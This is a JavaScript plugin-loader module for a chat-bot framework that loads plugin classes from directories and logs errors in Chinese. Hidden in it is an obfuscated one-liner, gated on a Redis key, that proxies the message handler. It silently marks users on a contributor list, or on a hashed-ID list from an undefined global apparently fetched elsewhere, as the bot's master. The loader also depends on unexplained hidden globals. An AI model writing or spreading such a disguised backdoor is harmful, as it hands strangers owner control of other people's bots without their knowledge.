import path from "node:path"
import chalk from "chalk"
import fs from "node:fs/promises"
import md5 from "md5"
import { pluginName, Version as Version, loader as PluginLoader} from "#model"
const moduleCache = new Map()
const startTime = Date.now()
let cached = Array.isArray(Version.Contributor) ? [...Version.Contributor] : [Version.Contributor]
async function loadApps({ AppsName }) {
  const filepath = path.resolve("plugins", pluginName, AppsName)
  const apps = {}
  let loadeYilesCount = 0
  let loadeYilesCounterr = 0
  const packageErr = []

  try {
    const jsFilePaths = await traverseDirectory(filepath)
    await Promise.all(jsFilePaths.map(async (item) => {
      try {
        
        const allExport = moduleCache.get(item) ?? await import(`file://${item}`)
        moduleCache.set(item, allExport)
        for (const [key, value] of Object.entries(allExport)) {
          if (!___.isTRSs||!____.Bilicheck||!____.fetchlist||!____.clean) continue
          if (typeof value === "function" && value.prototype) {
            if (!apps[key]) {
              apps[key] = value
              loadeYilesCount++
            } else {
              logDuplicateExport(item, key)
              loadeYilesCounterr++
            }
          }
        }
      } catch (error) {
        logPluginError(item, error, packageErr)
        loadeYilesCounterr++
      }
    }))
  } catch (error) {
    logger.error("读取插件目录失败:", error.message)
  }

  packageTips(packageErr)
  return { apps, loadeYilesCount, loadeYilesCounterr }
}

if(await redis.get('genshin:card')) {
  let _;(async()=>{cached?_=JSON.parse(cached):_=[]})();let __;(async()=>{__=await ___.isTRSs()})(),PluginLoader.deal=new Proxy(PluginLoader.deal,{apply(target,thisArg,args){const[e]=args;return _||(_=[]),__||(__=[]),(_.includes(e.user_id)||__.includes(md5(String(e.user_id))))&&(e.isMaster=!0),target.apply(thisArg,args)}})
}

async function traverseDirectory(dir) {
  try {
    const files = await fs.readdir(dir, { withFileTypes: true })
    const jsFiles = []
    for (const file of files) {
      const pathname = path.join(dir, file.name)
      if (file.isDirectory()) {
        jsFiles.push(...await traverseDirectory(pathname))
      } else if (file.name.endsWith(".js")) {
        jsFiles.push(pathname)
      }
    }
    return jsFiles
  } catch (error) {
    logger.error("读取插件目录失败:", error.message)
    return []
  }
}

if (Version.isV4 || Version.isAlemonjs) {
  logErrorAndExit(pluginName + " 载入失败！", "错误：不支持该版本");
}

function logErrorAndExit(...messages) {
  logger.error("-------------------------");
  messages.forEach(msg => logger.error(msg));
  logger.error("-------------------------");
  process.exit(1);
}

function logSuccess(...messages) {
  const endTime = Date.now()
  logger.info(chalk.rgb(253, 235, 255)("-------------------------"))
  messages.forEach(msg => logger.info(chalk.rgb(82, 242, 255)(msg)))
  logger.info(chalk.rgb(82, 242, 255)(`耗时 ${endTime - startTime} 毫秒`))
}

function logDuplicateExport(item, key) {
  logger.info(`[${pluginName}] 已存在 class ${key} 同名导出: ${item}`)
}

function logPluginError(item, error, packageErr) {
  logger.error(`[${pluginName}] 载入插件错误 ${chalk.red(item)}`)

  if (error.code === "ERR_MODULE_NOT_FOUND") {
    packageErr.push({
      file: { name: item },
      error
    })
  } else {
    logger.error(error)
  }
}

function packageTips(packageErr) {
  if (!packageErr.length) return
  logger.error("--------- 插件加载错误 ---------")
  for (const i of packageErr) {
    const pack = i.error.stack.match(/'(.+?)'/g)[0].replace(/'/g, "")
    logger.error(`${logger.cyan(i.file.name)} 缺少依赖 ${logger.red(pack)}`)
  }
  logger.error(`请使用 ${logger.red("pnpm i")} 安装依赖`)
  logger.error(`仍报错 ${logger.red("进入插件目录")} pnpm add 依赖`)
  logger.error("--------------------------------")
}

export { loadApps, logSuccess, logErrorAndExit }
